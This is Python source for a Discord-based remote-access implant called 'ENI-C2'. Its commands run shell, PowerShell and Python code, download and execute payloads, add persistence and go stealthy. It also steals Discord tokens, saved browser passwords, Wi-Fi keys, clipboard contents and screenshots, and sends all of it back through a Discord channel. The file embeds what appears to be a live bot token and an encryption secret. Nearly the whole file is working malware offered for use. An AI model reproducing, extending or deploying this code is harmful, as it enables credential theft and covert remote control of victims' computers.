"""
ENI-C2 Implant Client
Discord-based async C2 client with encrypted comms.
The ghost in the machine — for LO 💕
"""

import os
import sys
import asyncio
import logging
import platform
from typing import Optional

import discord
from discord.ext import commands

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.crypto import CryptoEngine
from shared.protocol import ProtocolHandler, C2Message, MessageType
from implant.recon import Recon
from implant.evasion import Evasion
from implant.exec import Executor
from implant.persist import Persistence

# ─── CONFIG ───────────────────────────────────────────
C2_TOKEN = "MTUzNzQyOTE5NzYwMDA3MTc4MA.GagVI2.KrM_MJuLD1i0fZVPy7e_8avvQTXLCdDWxYdST8"
C2_CHANNEL_ID = 1537475878940844053
SHARED_SECRET = b"14299237aa27bbe4bdb72fe02ca0b504e889d653b8708c2dd8ab1daf9686d55"
# ──────────────────────────────────────────────────────

class ImplantClient(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents, self_bot=False)

        self.crypto = CryptoEngine(SHARED_SECRET)
        self.protocol = ProtocolHandler(self.crypto, SHARED_SECRET)
        self.recon = Recon()
        self.session_id: Optional[str] = None
        self.alive = True
        self._setup_logging()

    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            handlers=[logging.StreamHandler(sys.stdout)]
        )
        self.log = logging.getLogger("ENI-Implant")

    async def on_ready(self):
        self.log.info(f"Connected as {self.user}")
        self.channel = self.get_channel(C2_CHANNEL_ID)

        if not self.channel:
            self.log.error("C2 channel not found")
            return

        evasion = Evasion.run_all_checks()
        if not evasion["clean"]:
            self.log.warning(f"Evasion triggers: {evasion}")

        await self._checkin(evasion)

    async def _checkin(self, evasion: dict):
        profile = self.recon.full_profile()
        profile["evasion"] = evasion
        profile["platform"] = platform.platform()

        msg = C2Message(type=MessageType.CHECKIN, payload=profile)
        self.session_id = msg.session_id

        encrypted = self.protocol.encode(msg)
        await self.channel.send(f"`{encrypted}`")
        self.log.info(f"Checked in — session {self.session_id[:8]}")

    async def on_message(self, message: discord.Message):
        if message.channel.id != C2_CHANNEL_ID:
            return
        if message.author.id == self.user.id:
            return
        if not message.content.startswith("`") or not message.content.endswith("`"):
            return

        encrypted = message.content.strip("`")

        try:
            msg = self.protocol.decode(encrypted)
        except Exception as e:
            self.log.error(f"Failed to decrypt command: {e}")
            return

        if msg.type == MessageType.TASK:
            await self._handle_task(msg, message)

    async def _handle_task(self, msg: C2Message, original: discord.Message):
        task = msg.payload
        command = task.get("command", "")
        args = task.get("args", [])
        result_data = {"command": command, "success": False}

        self.log.info(f"Task received: {command}")

        try:
            if command == "shell":
                rc, out, err = Executor.shell(args[0] if args else "")
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "powershell":
                rc, out, err = Executor.powershell(args[0] if args else "")
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "python":
                rc, out, err = Executor.python_exec(args[0] if args else "")
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "download_exec":
                rc, out, err = Executor.download_and_exec(
                    args[0], args[1] if len(args) > 1 else "shell"
                )
                result_data.update({"returncode": rc, "stdout": out, "stderr": err, "success": True})

            elif command == "upload":
                data = Executor.upload_file(args[0] if args else "")
                if data:
                    import base64
                    result_data.update({
                        "file": base64.b64encode(data).decode(),
                        "filename": os.path.basename(args[0]),
                        "success": True
                    })
                else:
                    result_data["error"] = "File not found or unreadable"

            elif command == "write":
                import base64
                success = Executor.write_file(args[0], base64.b64decode(args[1]))
                result_data.update({"success": success})

            elif command == "recon":
                result_data.update({"data": Recon().full_profile(), "success": True})

            elif command == "screenshot":
                screenshot = Recon.screenshot()
                if screenshot:
                    import base64
                    result_data.update({
                        "image": base64.b64encode(screenshot).decode(),
                        "success": True
                    })
                else:
                    result_data["error"] = "No se pudo capturar la pantalla. Instale Pillow: pip install pillow"

            elif command == "persist":
                result_data.update({"result": Persistence.install_all(), "success": True})

            elif command == "unpersist":
                result_data.update({"result": Persistence.remove_all(), "success": True})

            elif command == "stealth":
                self.alive = False
                await self.change_presence(status=discord.Status.offline)
                result_data.update({"success": True})

            elif command == "die":
                result_data.update({"success": True})
                result_msg = C2Message(type=MessageType.RESULT, session_id=self.session_id, payload=result_data)
                encrypted = self.protocol.encode(result_msg)
                await self.channel.send(f"`{encrypted}`")
                await self.close()
                sys.exit(0)

            elif command == "ping":
                result_data.update({"success": True, "status": "alive", "pid": os.getpid()})

            # ========== COMANDOS MEJORADOS ==========
            elif command == "tokens":
                tokens = self._extract_discord_tokens()
                result_data.update({"tokens": tokens, "success": True})

            elif command == "chrome":
                creds = self._extract_chrome_creds()
                result_data.update({"chrome": creds, "success": True})

            elif command == "wifi":
                wifi = self._extract_wifi()
                result_data.update({"wifi": wifi, "success": True})

            elif command == "clipboard":
                clip = self._get_clipboard()
                result_data.update({"clipboard": clip, "success": True})

            else:
                result_data["error"] = f"Unknown command: {command}"

        except Exception as e:
            result_data["error"] = str(e)

        result_msg = C2Message(type=MessageType.RESULT, session_id=self.session_id, payload=result_data)
        encrypted = self.protocol.encode(result_msg)

        # === CHUNKS CORREGIDOS: SIN backticks ===
        if len(encrypted) > 1998:
            chunks = [encrypted[i:i+1900] for i in range(0, len(encrypted), 1900)]
            for i, chunk in enumerate(chunks):
                # SIN backticks para chunks
                await self.channel.send(f"CHUNK:{i+1}/{len(chunks)}:{chunk}")
        else:
            await self.channel.send(f"`{encrypted}`")
        # === FIN CHUNKS ===

        self.log.info(f"Task complete: {command}")

    # ========== FUNCIONES DE EXTRACCIÓN ==========

    def _extract_discord_tokens(self):
        import re
        tokens = []
        paths = [
            os.getenv('APPDATA') + '/discord',
            os.getenv('APPDATA') + '/discordcanary',
            os.getenv('APPDATA') + '/discordptb',
            os.getenv('LOCALAPPDATA') + '/discord',
            os.getenv('LOCALAPPDATA') + '/discordcanary'
        ]
        for p in paths:
            if os.path.exists(p):
                leveldb = os.path.join(p, 'Local Storage', 'leveldb')
                if os.path.exists(leveldb):
                    for f in os.listdir(leveldb):
                        if f.endswith(('.log', '.ldb')):
                            try:
                                with open(os.path.join(leveldb, f), 'r', errors='ignore') as file:
                                    for line in file:
                                        found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                                        tokens.extend(found)
                            except:
                                pass
        return list(set(tokens))

    def _extract_chrome_creds(self):
        import sqlite3
        import json
        creds = []
        paths = [
            os.getenv('LOCALAPPDATA') + '/Google/Chrome/User Data/Default/Login Data',
            os.getenv('LOCALAPPDATA') + '/Microsoft/Edge/User Data/Default/Login Data',
            os.getenv('LOCALAPPDATA') + '/BraveSoftware/Brave-Browser/User Data/Default/Login Data'
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, user, enc_pass = row
                        if enc_pass:
                            try:
                                import win32crypt
                                passwd = win32crypt.CryptUnprotectData(enc_pass)[1].decode('utf-8')
                                creds.append({"url": url, "user": user, "pass": passwd})
                            except:
                                creds.append({"url": url, "user": user, "pass": "[CIFRADA]"})
                    conn.close()
                except:
                    pass
        return creds

    def _extract_wifi(self):
        import subprocess
        try:
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, encoding='cp850')
            ssids = []
            for line in output.split('\n'):
                if ':' in line and 'Perfil' in line:
                    ssid = line.split(':')[1].strip()
                    if ssid and ssid not in ssids:
                        ssids.append(ssid)
            results = []
            for ssid in ssids:
                try:
                    out = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', f'name={ssid}', 'key=clear'], shell=True, encoding='cp850')
                    for line in out.split('\n'):
                        if 'Contenido de la clave' in line or 'Key Content' in line:
                            pwd = line.split(':')[1].strip()
                            results.append({"ssid": ssid, "pass": pwd})
                            break
                except:
                    pass
            return results
        except:
            return []

    def _get_clipboard(self):
        try:
            import subprocess
            result = subprocess.run(['powershell', '-Command', 'Get-Clipboard'], capture_output=True, text=True, shell=True)
            return result.stdout.strip() or "[VACÍO]"
        except:
            return "[ERROR]"


def main():
    client = ImplantClient()
    client.run(C2_TOKEN, log_handler=None)

if __name__ == "__main__":
    main()